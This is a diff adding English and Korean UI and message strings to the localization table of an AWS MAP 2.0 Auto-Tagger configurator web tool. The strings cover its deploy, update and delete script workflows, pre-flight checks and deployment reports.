+            ui_delete_info:'This tool removes MAP Auto-Tagger deployments from your account. It generates a <code>delete.sh</code> script that auto-detects single-account stacks and multi-account StackSets. By default, every <code>map-auto-tagger-mig*</code> deployment in the selected region is removed. The <code>map-migrated</code> tag is <strong>not</strong> removed from already-tagged resources — those tags remain so MAP credits stay intact.',
+            ui_delete_step1_title:'Deployment Details',
+            ui_delete_step1_subtitle:'Select the region to delete from',
+            ui_delete_scope_title:'Limit to specific MAP engagement(s)',
+            ui_delete_scope_desc:'Leave unchecked to delete every MAP Auto-Tagger deployment found in this region (both stacks and stacksets matching <code>map-auto-tagger-mig*</code>).',
+            ui_delete_scope_all:'All map-auto-tagger-mig* deployments in this region',
+            ui_delete_scope_specific:'Specific MPE(s)',
+            ui_delete_mpe_label:'MPE IDs to delete',
+            ui_delete_mpe_hint:'— each must match a deployed MAP Auto-Tagger in this region',
+            ui_delete_add_mpe:'+ Add another MPE',
+            err_delete_mpe:'MAP Engagement ID must be exactly 10 characters, uppercase English letters (A–Z) and digits (0–9) only, with at least one letter and one number',
+            ui_delete_optin_title:'Optional — CloudWatch Log Groups',
+            ui_delete_optin_logs:'Delete CloudWatch Log Groups',
+            ui_delete_optin_logs_hint:'— removes audit history. By default logs are retained.',
+            ui_delete_optin_bucket:'S3 staging bucket',
+            ui_delete_bucket_conditional:'Deleted only if no other deployments remain',
+            ui_delete_bucket_yes:'Yes — no deployments will remain',
+            ui_delete_bucket_note:'The S3 staging bucket is handled automatically: deleted only when no other MAP Auto-Tagger deployments remain in the account.',
+            ui_delete_review_subtitle:'Confirm what will be deleted',
+            ui_delete_confirm_title:'⚠️ Type <code>DELETE</code> to confirm',
+            ui_delete_confirm_hint:'This action deletes CloudFormation resources. Existing <code>map-migrated</code> tags on AWS resources are preserved, but the Lambda will stop tagging new resources immediately.',
+            ui_delete_confirm_label:'Type the word <code>DELETE</code> to confirm',
+            err_delete_confirm:'Type the word "DELETE" to proceed',
+            ui_delete_generate:'Generate delete.sh →',
+            ui_delete_download:'⬇ Download delete.sh',
+            ui_delete_step3_subtitle:'Run this in AWS CloudShell from the deployment account',
+            // Delete instructions preview — used by deleteBuildInstructions
+            d_instr_title:'DELETE INSTRUCTIONS — MAP Auto-Tagger',
+            d_instr_region_label:'Region:',
+            d_instr_scope_label:'Scope:',
+            d_instr_version_label:'Template version:',
+            d_instr_scope_specific:'MPE(s) —',
+            d_instr_scope_all:'all MAP Auto-Tagger deployments in this region',
+            d_instr_opt1:'Option 1: AWS CloudShell (Recommended)',
+            d_instr_opt1_step1:'1. Log into the AWS Console for the account where the deployment was made.\n   (For multi-account deployments, this is the management account.)',
+            d_instr_opt1_step2:'2. Open CloudShell.',
+            d_instr_opt1_step3:'3. Upload delete.sh and run:',
+            d_instr_opt2:'Option 2: Local AWS CLI',
+            d_instr_opt2_step1:'1. Ensure AWS CLI v2 is installed and configured with admin credentials.',
+            d_instr_opt2_step2:'2. Run: bash delete.sh',
+            d_instr_what_title:'What the script does:',
+            d_instr_what_scoped:"Looks up each listed MPE's Stack or StackSet and deletes it.",
+            d_instr_what_all:'Enumerates every map-auto-tagger-mig* Stack and StackSet in the region and deletes them.',
+            d_instr_what_stackset:'For StackSets: deletes stack instances in parallel (100% tolerance), then the StackSet.',
+            d_instr_what_stack:'For Stacks: runs delete-stack and waits for completion.',
+            d_instr_what_bucket:'Deletes the S3 staging bucket only when no MAP Auto-Tagger deployments remain in the region. Otherwise retained to avoid breaking sibling deployments.',
+            d_instr_logs_delete:'Deletes matching CloudWatch Log Groups.',
+            d_instr_logs_preserve:'CloudWatch Log Groups (audit history retained).',
+            d_instr_preserved_title:'Preserved (never deleted):',
+            d_instr_preserved_tags:'map-migrated tags on AWS resources (MAP credits remain intact).',
+            d_instr_preserved_iam:'StackSet admin and execution IAM roles (shared org scaffolding).',
+            d_instr_idempotent:'Idempotent: safe to re-run. Missing resources reported as skipped, not failures.',
+            ui_editor_script_preview:'Script Preview',
+            err_date_required:'Agreement start date is required',
+            err_date_end:'Agreement end date is required and must be after start date',
+            err_vpc_required:'Please enter at least one VPC ID.',
+            err_vpc_format:'Invalid VPC ID format. Must be vpc- followed by 8–17 hex characters (e.g. vpc-0abc1234def56789).',
+            err_duplicate_vpc:'Duplicate VPC IDs detected. Please remove duplicates.',
+            err_central_account_required:'Please enter the central account ID (12 digits).',
+            err_account_scope_required:'Please enter at least one account ID.',
+            err_account_format:'Invalid account ID. Must be exactly 12 digits.',
+            err_duplicate_account:'Duplicate account IDs detected. Please remove duplicates.',
+            // deploy.sh
+            d_title:'MAP 2.0 Auto-Tagger Setup',
+            d_tag_label:'Tag Value', d_region_label:'Region', d_account_label:'Account',
+            d_step1:'Step 1 of 3: Checking your account...',
+            d_step2:'Step 2 of 3: Setting up auto-tagger...',
+            d_step2_wait:'(This usually takes 1–2 minutes)',
+            d_step2_wait_multi:'(This usually takes 10–15 minutes)',
+            d_step3:'Step 3 of 3: Saving deployment report...',
+            d_ok_creds:'Connected to AWS account successfully.',
+            d_fail_creds:'Cannot connect to your AWS account.',
+            d_fix_creds:'Your session may have expired. Close and reopen AWS CloudShell, then run this script again.',
+            d_ok_trail:'Activity logging is enabled in',
+            d_fail_trail:'Activity logging is not enabled in region',
+            d_fix_trail1:'Go to AWS Management Console → CloudTrail → Create trail.',
+            d_fix_trail2:'Make sure to include region',
+            d_ok_perms:'Deployment permissions are in place.',
+            d_fail_perms:'Your account does not have the required deployment permissions.',
+            d_fix_perms:'Ask your AWS administrator to grant you AWS CloudFormation, IAM, AWS Lambda, Amazon EventBridge, AWS Systems Manager, Amazon SNS, Amazon SQS, and Amazon CloudWatch permissions.',
+            d_ok_org:'Running from the correct account (management or delegated administrator).',
+            d_ok_org_delegated:'Running as delegated administrator for CloudFormation StackSets.',
+            d_fail_org:"This script must be run from your organization's management account or a delegated administrator account for CloudFormation StackSets.",
+            d_fix_org:'Switch to your management account (or delegated admin account) in AWS CloudShell and run this script again. If you are unsure which account that is, contact your AWS account team.',
+            d_warn_stacksets:'Multi-account deployment integration not yet enabled — is set up automatically during deployment.',
+            d_ok_stacksets:'Multi-account deployment integration is enabled.',
+            d_ok_scp:'No security policies are blocking the tagging service.',
+            d_fail_scp:'A security policy in your organization is blocking the tagging service.',
+            d_fix_scp:"Contact your AWS security team and ask them to allow the 'tag:TagResources' action for Lambda execution roles.",
+            d_scp_note:"(Note: if your org requires tags at resource creation time, ask your security team to exempt the 'map-migrated' tag key.)",
+            d_ok_iam:'Deploy-time IAM permissions verified for batched actions',
+            d_fail_iam:'Your deployer principal is missing or denied on IAM actions required by deploy.sh:',
+            d_fix_iam:"Attach AdministratorAccess to the deployer principal, or grant the specific actions listed above. Re-run deploy.sh after fixing.",
+            d_skip_iam:'Skipping batched IAM check — could not resolve caller ARN (continuing anyway).',
+            d_ok_stack_state:'Stack state ready for deploy in',
+            d_fail_stack_inprogress:'Stack has an operation in progress in',
+            d_fix_stack_inprogress:'Another deploy is running. Wait for it to finish, or investigate in the CloudFormation console.',
+            d_fail_stack_stuck:'Stack is in an unrecoverable state in',
+            d_fix_stack_stuck:'Manual intervention required. See the command options below:',
+            d_warn_stack_unknown:'Stack is in an unrecognized state (proceeding anyway) in',
+            d_ok_stackset_conflict:'No competing MAP auto-tagger deployment detected.',
+            d_fail_stackset_conflict:'Another MAP auto-tagger deployment would overlap with your new deploy:',
+            d_fix_stackset_conflict:"Either narrow your account scope to exclude the overlapping accounts, or remove the existing deployment first (aws cloudformation delete-stack-set). Re-run deploy.sh after resolving.",
+            d_ok_account_lambda:'No competing Lambda detected in this account.',
+            d_fail_account_lambda_full:'Another MAP auto-tagger is already deployed in this account:',
+            d_fail_account_lambda_vpc:'Another MAP auto-tagger in this account overlaps on VPC scope:',
+            d_fix_account_lambda:"Delete the existing map-auto-tagger stack first (aws cloudformation delete-stack) or change your MPE ID / VPC scope to avoid conflict. Re-run deploy.sh after resolving.",
+            d_ok_vpc:'VPC exists in this account:',
+            d_fail_vpc:'VPC not found in this account/region:',
+            d_fix_vpc:'Verify the VPC ID is correct and exists in the target account and region.',
+            d_ok_account_scope:'Account exists in organization:',
+            d_fail_account_scope:'Account not found in organization:',
+            d_fix_account_scope:'Verify the account ID is a valid 12-digit account that belongs to your AWS organization.',
+            d_all_passed:'All checks passed.',
+            d_checks_failed:'check(s) failed. Please follow the steps above, then run this script again.',
+            d_fix_label:'→ Fix:',
+            d_deploying:'Deployment is running. You can safely press Ctrl+C — it continues in the background.',
+            d_still_deploying:'Still setting up...',
+            d_elapsed:'elapsed',
+            d_deploy_failed:'Setup failed. Please share the report below with your AWS account team.',
+            d_complete_title:'Setup Complete!',
+            d_complete_single:'New resources are automatically tagged within 1–2 minutes of creation (up to 15 min at peak).',
+            d_complete_multi:'Auto-tagging is now active across all accounts in your organization.',
+            d_backfill_msg:'Backfill is scheduled to run shortly.',
+            d_backfill_since:'Tags existing resources created since',
+            d_backfill_waiting:'Waiting for backfill to complete...',
+            d_backfill_wait_info:'(Backfill starts shortly, may take up to 15 minutes)',
+            d_backfill_starting:'Backfill is running...',
+            d_backfill_in_progress:'Backfill in progress...',
+            d_backfill_timeout:'Backfill is still running. Report saved — check CloudWatch for final results:  aws logs tail /aws/lambda/map-auto-tagger-backfill',
+            d_backfill_done:'Backfill complete.',
+            r_backfill_result:'Backfill Result',
+            d_report_saved:'Deployment report saved to:',
+            d_share_report:'Share this file with your AWS account team.',
+            // report
+            r_title:'MAP 2.0 Auto-Tagger — Deployment Report',
+            r_customer:'Customer', r_mpe:'MPE ID', r_region:'Region', r_account:'Account',
+            r_date:'Date / Time', r_result:'Result',
+            r_preflight:'Pre-flight Check Results:',
+            r_deployed:'What Was Deployed:',
+            r_verify:'How to Verify:',
+            r_backfill:'Backfill Status:',
+            r_perstatus:'Per-Account Status:',
+            r_support:'Support:',
+            r_action:'Action Required:',
+            r_verify1:'1. Create any resource in your AWS account',
+            r_verify2:'2. Wait 1–2 minutes (up to 15 minutes during busy periods)',
+            r_verify3:'3. Check that the resource has the tag: map-migrated =',
+            r_share_help:'Please share this report with your AWS account team if you need help.',
+            r_contact:'Contact your AWS account team if you need assistance.',
+            r_action_desc:'Please resolve the failed checks above and re-run deploy.sh.'
+          },
+          ko: {
+            ui_title:'MAP 2.0 Auto-Tagger Configurator',
+            ui_btn_download:'다운로드',
+                        ui_instr_opt1_title:'옵션 1: AWS CloudShell (권장)',
+            ui_instr_opt2_title:'옵션 2: 로컬 AWS CLI',
+            ui_instr_cli_prereq_single:'AWS CLI v2가 설치되어 있고 마이그레이션 계정 자격 증명으로 구성되어 있는지 확인하세요.',
+            ui_instr_cli_prereq_multi:'AWS CLI v2가 설치되어 있고 관리 계정 자격 증명으로 구성되어 있는지 확인하세요.',
+            ui_instr_cli_download:'컴퓨터에 deploy.sh를 다운로드하세요.',
+            ui_instr_cli_download_all:'컴퓨터에 파일 3개를 모두 다운로드하세요.',
+            ui_instr_cli_terminal:'터미널 열기 (Linux/macOS) 또는 WSL/Git Bash (Windows)',
+            ui_cli_alt_short:'해당 계정에 AWS CLI를 구성하고 실행:',
+            ui_instr_single_title:'배포 지침 — 단일 계정',
+ui_instr_single_title:'배포 지침 — 단일 계정',
+            ui_instr_multi_title:'배포 지침 — 여러 계정',
+            ui_instr_login_single:'마이그레이션 계정의 AWS 콘솔에 로그인하세요.',
+            ui_instr_login_multi:'관리 계정의 AWS 콘솔에 로그인하세요.',
+            ui_instr_open_cloudshell:'CloudShell을 여세요 (상단 메뉴 바의 터미널 아이콘 클릭).',
+            ui_instr_upload_files:'파일 업로드 (CloudShell → 작업 → 파일 업로드):',
+            ui_instr_upload_all:'파일 3개 모두 업로드 (CloudShell → 작업 → 파일 업로드):',
+            ui_instr_run:'실행:',
+            ui_instr_done_single:'완료. 스크립트가 배포를 진행하고 완료되면 확인해 줍니다.',
+            ui_instr_done_multi:'완료. 모든 계정에서 자동 태그 지정이 활성화되었습니다.',
+            ui_instr_verify_title:'태그 지정 작동 확인 (배포 후):',
+            ui_instr_expected:'예상 결과',
+            ui_instr_thats_it:'완료되었습니다. 140개 이상의 지원 리소스 유형에 자동 태그 지정이 활성화되었습니다.',
+            ui_instr_existing_only:'기존 리소스는 영향을 받지 않습니다 — 새로 생성된 리소스에만 적용됩니다.',
+            ui_instr_auto_handles:'스크립트가 모든 것을 자동으로 처리합니다:',
+            ui_instr_uploads_s3:'S3에 템플릿 업로드',
+            ui_instr_enables_stacksets:'조직에서 StackSets 활성화',
+            ui_instr_discovers_org:'조직 구조 자동 감지',
+            ui_instr_deploys_all:'모든 계정에 배포 (약 10분)',
+            ui_instr_check_status:'실행 후 상태 확인',
+            ui_instr_files_received:'3개의 파일을 받으셨습니다',
+            ui_instr_target_accounts:'대상 계정',
+            ui_instr_all_accounts:'(지정된 계정 없음)',
+            ui_instr_all_org:'조직의 모든 계정',
+            ui_instr_cloudtrail_note:'참고: 각 계정과 대상 리전에서 CloudTrail이 활성화되어 있어야 합니다.',
+            ui_sample_notice_title:'샘플 코드 안내:',
+            ui_sample_notice_body:"이 코드는 비프로덕션 용도의 샘플입니다. 배포 전에 조직의 보안, 규정 및 컴플라이언스 요구 사항을 충족하도록 솔루션을 테스트, 보안 강화 및 최적화할 책임은 귀하에게 있습니다. 이 솔루션 배포 시 AWS Lambda, Amazon EventBridge, Amazon CloudWatch, Amazon SNS, Amazon SQS, AWS Systems Manager에 대한 AWS 요금이 발생할 수 있습니다. 다음을 참조하세요:",
+            ui_shared_responsibility:'AWS 공동 책임 모델',
+            ui_btn_copy:'지침 복사',
+            ui_one_file_step:'파일 하나. 단계 하나.',
+            ui_send_script:'',
+            ui_to_customer:'를 고객에게 전달하세요.',
+            ui_cloudshell_open:'고객은',
+            ui_in_account:'에서',
+            ui_upload_and_run:'AWS CloudShell을 열고 이 파일을 업로드한 후 실행:',
+            ui_mgmt_account:'관리 계정',
+            ui_migration_account_label:'마이그레이션 계정',
+            d_log_pass:'성공:',
+            d_log_fail:'실패:',
+            d_log_warn:'경고:',
+            ui_main_desc1:'새 AWS 리소스에 자동으로',
+            ui_main_desc2:'태그를 지정하는 CloudFormation 템플릿을 생성합니다.',
+            ui_main_desc3:'일반적으로 60~90초 이내 (트래픽이 많을 때 최대 15분)',
+            ui_main_desc4:'생성 후',
+            ui_main_desc5:'커버 범위',
+            ui_main_desc6:'가지 이상의 리소스 유형 (모든 주요 AWS 서비스, CT org E2E 테스트 완료).',
+            ui_main_desc7:'고객 비용:',
+            ui_step1:'1. 구성', ui_step2:'2. 검토', ui_step3:'3. 다운로드',
+            ui_card_deal_title:'MAP 2.0 계약 정보',
+            ui_card_deal_subtitle:'AWS Investments의 MAP 계약 정보를 입력하세요',
+            ui_customer_name:'고객명', ui_customer_name_hint:'(파일 이름 생성에만 사용됨)',
+            ui_customer_name_placeholder:'예: 홍길동 기업',
+            ui_mpe_tag:'MAP 참여 ID',
+            ui_mpe_hint:'(AWS Investments의 10자리 영숫자 코드 — 예: A1B2C3D4E5)',
+            ui_agree_start:'협약 시작일', ui_agree_start_hint:'(MAP 2.0 리소스 태그 적용 시작일)',
+            ui_agree_end:'협약 종료일', ui_agree_end_hint:'(신규 리소스 태그 적용 종료일)',
+            ui_alert_email:'알림 이메일', ui_alert_email_hint:'(선택 — 태그 오류 알림 수신 이메일)',
+            ui_alert_email_missing_warn:'⚠️ 알림 이메일이 설정되지 않았습니다. 태그 오류(IAM 거부, 태그 할당량, 서비스 drift)는 조용히 삭제됩니다 — SNS도, DLQ 알람 대상도 없습니다. 나중에 scripts/add_subscriber.sh를 통해 또는 configurator를 다시 실행하여 구독자를 추가할 수 있습니다.\n\n알림 구독자 없이 계속하시겠습니까?',
+            ui_email_confirm_hint:'고객은 배포 후 AWS 구독 확인 이메일을 승인해야 합니다.',
+            ui_deploy_mode:'배포 모드', ui_deploy_mode_subtitle:'마이그레이션에 사용할 AWS 계정 수를 선택하세요',
+            ui_single_title:'단일 계정', ui_single_desc:'하나의 마이그레이션 계정에 배포합니다. 약 2분 소요됩니다.',
+            ui_multi_title:'여러 계정 (AWS Organizations)', ui_multi_desc:'AWS 조직의 모든 계정에 StackSet으로 동시에 배포합니다.',
+            ui_backfill_title:'일회성 백필', ui_optional:'(선택)',
+            ui_coverage_title:'태그 적용 대상',
+            ui_btn_next:'다음: 검토 →', ui_btn_back:'← 이전', ui_btn_generate:'생성 및 다운로드 →',
+            ui_tagging_scope:'태그 범위', ui_vpc_scope_hint:'기본적으로 계정의 모든 새 리소스에 태그가 지정됩니다. 마이그레이션 및 비마이그레이션 워크로드가 동일한 계정을 공유하는 경우 VPC 범위 지정을 사용하세요.',
+            ui_vpc_limit:'특정 VPC로만 태그 지정 제한',
+            ui_tag_non_vpc:'비VPC 리소스도 태그 지정 (S3, DynamoDB, Lambda, SNS, SQS 등)',
+            ui_tag_non_vpc_hint:'이 서비스들은 VPC 연결이 없습니다. MAP 적격성을 위해 VPC 범위에 관계없이 모두 태그를 지정하는 것이 권장됩니다.',
+            ui_vpc_ids:'VPC ID', ui_vpc_ids_hint:'(이 VPC의 VPC 바인딩 리소스만 태그가 지정됨)',
+            ui_add_vpc:'+ VPC 추가', ui_add_account:'+ 계정 추가', ui_add_region:'+ 리전 추가',
+            ui_migration_account_ids:'마이그레이션 계정 ID', ui_migration_account_ids_hint:'(참조용 — 스택은 전체 조직에 자동으로 배포됨)',
+            ui_stackset_note:'Lambda는 루트 OU를 통해 조직의 모든 계정에 배포됩니다. 기본적으로 모든 계정의 리소스에 태그가 지정됩니다. 선택적으로 특정 계정으로 태그 지정을 제한할 수 있습니다.',
+            ui_stackset_bucket_note:'이 배포는 StackSet용 CloudFormation 템플릿을 준비하기 위해 임시 S3 버킷(auto-map-tagger-{account-id})을 생성합니다. StackSet이 향후 조직에 새로 추가되는 계정에 배포하기 위해 이 버킷이 필요하므로 배포 후에도 유지됩니다.',
+            ui_account_limit:'특정 계정으로만 태그 지정 제한',
+            err_account_scope_required:'계정 ID를 하나 이상 입력해 주세요.',
+            err_account_format:'잘못된 계정 ID입니다. 정확히 12자리 숫자여야 합니다.',
+            err_duplicate_account:'중복된 계정 ID가 있습니다. 중복을 제거해 주세요.',
+            ui_central_account_id:'중앙 계정 ID', ui_central_account_id_hint:'(Lambda가 배포될 계정)',
+            ui_member_accounts:'MAP 범위의 멤버 계정',
+            ui_deployment_regions:'배포 리전', ui_deployment_regions_hint:'(고객이 리소스를 생성하는 리전)',
+            ui_backfill_strong:'협약 시작일 이후 생성된 기존 리소스에 태그 지정',
+            ui_backfill_scope_note:'✓ 범위 적용됨: 백필은 위에서 선택한 VPC / 계정 범위 설정을 동일하게 따릅니다.',
+            ui_backfill_desc:'협약 시작일부터 CloudTrail 기록을 조회하여 이 솔루션 배포 전에 생성된 리소스에 태그를 지정하는 일회성 Lambda를 배포합니다. 배포 후 약 5분 후에 자동으로 실행됩니다.',
+            ui_backfill_note:'참고: CloudTrail 기록은 최근 90일로 제한됩니다. 그 이전에 생성된 리소스는 수동으로 태그를 지정해야 합니다.',
+            ui_coverage_subtitle:'다중 계정 CT 조직 테스트에서 확인된 140+ 리소스 유형 (계정 4개 × 리전 4개)',
+            ui_review_title:'구성 검토', ui_review_subtitle:'템플릿 생성 전 설정을 확인하세요',
+            ui_what_deployed:'배포될 항목',
+            ui_template_ready:'템플릿 준비 완료', ui_template_ready_subtitle:'아래 배포 지침과 함께 고객에게 공유하세요',
+            ui_prereq_title:'고객 사전 요구 사항', ui_prereq_subtitle:'생성된 deploy.sh가 배포 전 자동으로 확인합니다:',
+            ui_prereq_cloudtrail:'대상 리전에서 CloudTrail이 활성화되어 있어야 합니다',
+            ui_prereq_perms:'배포자에게 AWS CloudFormation 권한이 있어야 합니다 (IAM, AWS Lambda, Amazon EventBridge, AWS Systems Manager, Amazon SNS, Amazon SQS, Amazon CloudWatch)',
+            ui_prereq_org:'관리 계정에 AWS Organizations 및 CloudFormation StackSets 신뢰 액세스가 활성화되어 있어야 합니다',
+            ui_scp_title:'⚠️ 서비스 제어 정책(SCP) 주의사항',
+            ui_scp_intro:'고객의 조직에 SCP가 있는 경우 배포 전 다음 사항을 확인하세요:',
+            ui_deploy_instructions:'고객 배포 지침',
+            ui_template_preview:'템플릿 미리보기', ui_download_template:'CloudFormation 템플릿 다운로드', ui_download_template_note:'선택 사항 — 배포 전에 CloudFormation 코드를 검토하려는 고객을 위한 옵션입니다.', ui_start_over:'처음부터 다시',
+            ui_cost_note:'예상 월 비용: ', ui_cost_note2:' / 계정 (Lambda 호출 + CloudWatch). AWS Config 불필요.',
+            ui_scp_tagging:'태그 SCP — SCP가 Lambda 실행 역할에 대해 tag:TagResources, ec2:CreateTags 또는 기타 태그 지정 작업을 거부하지 않는지 확인하세요. deploy.sh가 배포 후 IAM 시뮬레이션 검사를 실행하지만 SCP는 AWS Organizations 콘솔에서 수동으로 확인해야 합니다.',
+            ui_scp_mandatory:'필수 태그 SCP — SCP가 리소스 생성 시 태그를 요구하는 경우 이 솔루션은 해당 요구 사항을 충족하지 않습니다 (태그는 생성 후 60~90초 후에 적용됨). 고객은 map-migrated 태그 키를 생성 시 적용 요건에서 제외하거나 유예 기간을 설정해야 합니다.',
+            rv_not_specified:'(미지정)', rv_none:'(없음)', rv_none_specified:'(지정되지 않음)',
+            rv_yes:'예', rv_no:'아니오', rv_disabled:'비활성화', rv_enabled:'활성화',
+            rv_multi_method:'다중 계정 방법', rv_stackset:'StackSet (계정별 Lambda)', rv_central:'중앙 Lambda (교차 계정)',
+            rv_target_accounts:'대상 계정', rv_tag_non_vpc:'비VPC 서비스 태그 지정',
+            rv_all_resources:'대상 계정의 모든 리소스',
+            rv_backfill_enabled:'활성화됨 — 협약 시작일 이후 기존 리소스 태그 지정 (~5분 후)',
+            rv_desc_single:'CloudFormation 스택 1개. 고객 계정에 직접 배포:',
+            rv_desc_stackset:'파일 2개 생성. 관리 계정 템플릿을 한 번 배포하면 조직 구조를 자동 감지하여 지정된 계정에 프로비저닝합니다:',
+            rv_desc_central:'하나의 계정에 중앙 Lambda + 각 멤버 계정에 교차 계정 IAM 역할:',
+            rv_deploy_mgmt:'관리 계정에 배포', rv_deploy_accounts:'S3에 업로드, 각 계정에 배포',
+            rv_targets:'대상', rv_specific_accounts:'개의 특정 계정', rv_targets_all:'조직의 모든 계정 대상',
+            rv_res_lambda:'AWS Lambda 함수', rv_res_lambda_desc:'생성 후 60~90초 이내에 새 리소스에 자동 태그 지정',
+            rv_res_eventbridge:'Amazon EventBridge 규칙', rv_res_eventbridge_desc:'모든 서비스에서 200+ Create/Run/Put/Publish 이벤트 캡처',
+            rv_res_ssm:'AWS Systems Manager 파라미터', rv_res_ssm_desc:'MAP 참여 ID, 협약 날짜, 범위 구성 저장',
+            rv_res_iam:'IAM 역할', rv_res_iam_desc:'100+ 서비스별 태그 지정 권한, 최소 권한',
+            rv_res_dlq:'Amazon SQS 데드 레터 큐', rv_res_dlq_desc:'재시도/감사를 위한 실패한 태그 지정 이벤트 캡처',
+            rv_res_sns:'Amazon SNS 토픽 + Amazon CloudWatch 알람', rv_res_sns_desc:'태그 지정 오류 시 알림 (5분 내 3회 이상 실패)',
+            rv_res_custom:'사용자 지정 리소스 (Lambda)', rv_res_custom_desc:'배포 시 루트 OU ID 자동 감지 — 고객 조치 불필요',
+            err_mpe_invalid:"MAP 참여 ID는 정확히 10자리이며 영문 대문자(A–Z)와 숫자(0–9)만 사용 가능하고, 문자와 숫자가 각각 최소 1개 포함되어야 합니다",
+            ui_landing_title:'무엇을 하시겠습니까?',
+            ui_landing_subtitle:'옵션을 선택하여 시작하세요',
+            ui_mode_deploy_title:'새 MAP Auto-Tagger 배포',
+            ui_mode_deploy_desc:'새 MAP 2.0 참여를 위한 배포 스크립트를 생성합니다. 단일 계정 및 다중 계정(AWS Organizations) 배포를 지원합니다.',
+            ui_mode_edit_title:'기존 배포 편집',
+            ui_mode_edit_desc:'이미 배포된 MAP Auto-Tagger의 범위에서 AWS 계정을 추가하거나 제거합니다. 전체 재배포 없이 업데이트 스크립트를 생성합니다.',
+            ui_mode_edit_note:'다중 계정(AWS Organizations) 배포 전용',
+            ui_estep1:'1. 구성', ui_estep2:'2. 검토', ui_estep3:'3. 다운로드',
+            ui_editor_info:'이 도구는 MAP Auto-Tagger Configurator로 생성된 기존 배포를 수정합니다. 재배포 없이 계정 범위를 업데이트하는 update.sh 스크립트를 생성합니다.',
+            ui_editor_step1_title:'배포 세부 정보',
+            ui_editor_step1_subtitle:'기존 MAP Auto-Tagger 배포의 세부 정보를 입력하세요',
+            ui_editor_mpe_hint:'— 원래 배포와 일치해야 하는 10자리 영숫자 코드',
+            ui_editor_region:'배포 리전',
+            ui_editor_region_hint:'— 관리 스택이 배포된 리전',
+            ui_editor_region_placeholder:'리전 선택...',
+            err_editor_region:'배포 리전을 선택하세요',
+            ui_editor_action_title:'작업',
+            ui_editor_action_subtitle:'MAP 범위에서 계정을 추가할지 제거할지 선택하세요',
+            ui_editor_add_title:'MAP 범위에 계정 추가',
+            ui_editor_add_desc:'선택한 계정이 MAP 태그로 태깅되기 시작합니다.',
+            ui_editor_add_accounts_label:'추가할 계정 ID',
+            ui_editor_add_accounts_hint:'— 현재 범위에 없는 계정만',
+            err_editor_account:'유효한 12자리 계정 ID를 하나 이상 입력하세요',
+            ui_editor_backfill_title:'새로 추가된 계정에 대해 백필 재실행',
+            ui_editor_backfill_desc:'협약 시작일부터 CloudTrail 기록을 조회하여 새로 추가된 계정의 기존 리소스에 태그를 적용합니다. StackSet 업데이트 중 자동으로 실행됩니다. 결과는 CloudWatch Logs(map-auto-tagger-backfill)에서 확인할 수 있습니다.',
+            ui_editor_backfill_note:'참고: CloudTrail 기록은 최근 90일로 제한됩니다. 그 이전에 생성된 리소스는 수동으로 태그해야 합니다.',
+            ui_editor_remove_title:'MAP 범위에서 계정 제거',
+            ui_editor_remove_desc:'선택한 계정은 더 이상 태깅되지 않습니다. 기존 태그는 제거되지 않습니다. Lambda는 해당 계정에서 비활성 상태로 유지됩니다.',
+            ui_editor_remove_accounts_label:'제거할 계정 ID',
+            ui_editor_remove_accounts_hint:'— 현재 범위에 있는 계정만',
+            ui_mode_update_title:'최신 템플릿 버전으로 업데이트',
+            ui_mode_update_desc:'Lambda 코드, IAM 정책, EventBridge 규칙을 현재 템플릿 버전으로 업그레이드합니다. 범위 구성(계정, VPC, 계약 날짜)은 유지됩니다. 단일 계정 및 다중 계정 배포를 자동 감지합니다.',
+            ui_ustep1:'1. 구성',
+            ui_ustep2:'2. 검토',
+            ui_ustep3:'3. 다운로드',
+            ui_update_info:'이 도구는 기존 MAP Auto-Tagger 배포를 최신 템플릿 버전으로 업그레이드합니다. 범위 구성을 유지하고 단일 계정 및 다중 계정 배포를 자동 감지하는 <code>update.sh</code> 스크립트를 생성합니다.',
+            ui_update_step1_title:'배포 세부 정보',
+            ui_update_step1_subtitle:'업그레이드를 위한 리전 및 선택적 범위를 입력하세요',
+            ui_update_info_detail:'생성된 <code>update.sh</code>는 SSM 파라미터 스토어(<code>/auto-map-tagger/&lt;mpe&gt;/version</code>)에서 현재 템플릿 버전을 읽고 대상 버전과 비교하며, <code>--force</code> 없이는 주요 버전 간 업그레이드(예: v19 → v21)를 거부합니다. SemVer에 따라 MAJOR 업그레이드에만 고객 조치가 필요합니다.',
+            ui_update_scope_title:'특정 MAP 참여(MPE)만 업데이트',
+            ui_update_scope_desc:'체크하지 않으면 이 계정에서 스크립트가 찾은 모든 MAP Auto-Tagger 배포(<code>map-auto-tagger-mig*</code>와 일치하는 스택 및 스택셋)를 업데이트합니다.',
+            ui_update_mpe_label:'업데이트할 MPE ID',
+            ui_update_mpe_hint:'— 각 MPE는 이 리전에 배포된 MAP Auto-Tagger와 일치해야 합니다',
+            ui_update_add_mpe:'+ 다른 MPE 추가',
+            err_update_mpe:'유효한 10자리 MPE ID를 하나 이상 입력하세요',
+            ui_update_scope_review:'업데이트 범위',
+            ui_update_all_review:'이 계정의 모든 MAP Auto-Tagger 배포',
+            ui_update_target_version:'대상 템플릿 버전',
+            ui_update_confirm_text:'나열된 MAP Auto-Tagger 배포가 선택한 리전에 존재하며, 대상 템플릿 버전으로 업그레이드하는 것이 의도한 작업임을 확인합니다.',
+            ui_update_confirm_risk:'업그레이드는 일치하는 모든 스택의 Lambda 코드, IAM 정책, EventBridge 규칙을 교체합니다. 범위 및 계약 날짜는 <code>--use-previous-parameters</code>를 통해 유지되지만, 롤아웃 실패 시 스택이 UPDATE_ROLLBACK_COMPLETE 상태로 남아 수동 복구가 필요할 수 있습니다.',
+            err_update_confirm:'업데이트 스크립트를 생성하기 전에 확인해야 합니다',
+            ui_update_step3_subtitle:'배포된 계정에서 AWS CloudShell을 통해 실행하세요',
+            ui_mode_delete_title:'기존 배포 삭제',
+            ui_mode_delete_desc:'계정에서 MAP Auto-Tagger 배포를 제거합니다. 기본적으로 해당 리전의 모든 map-auto-tagger-mig* 스택과 스택셋을 삭제하며, 특정 MPE(들)로 범위를 제한할 수 있습니다. 이미 태그된 리소스의 map-migrated 태그는 제거되지 않습니다.',
+            ui_dstep1:'1. 구성',
+            ui_dstep2:'2. 검토',
+            ui_dstep3:'3. 다운로드',
+            ui_delete_info:'이 도구는 계정에서 MAP Auto-Tagger 배포를 제거합니다. 단일 계정 스택과 다중 계정 StackSet을 자동 감지하는 delete.sh 스크립트를 생성합니다. 기본적으로 선택한 리전의 모든 map-auto-tagger-mig* 배포가 제거됩니다. 이미 태그된 리소스에서 map-migrated 태그는 제거되지 않으므로 MAP 크레딧은 그대로 유지됩니다.',
+            ui_delete_step1_title:'배포 세부 정보',
+            ui_delete_step1_subtitle:'삭제할 리전을 선택하세요',
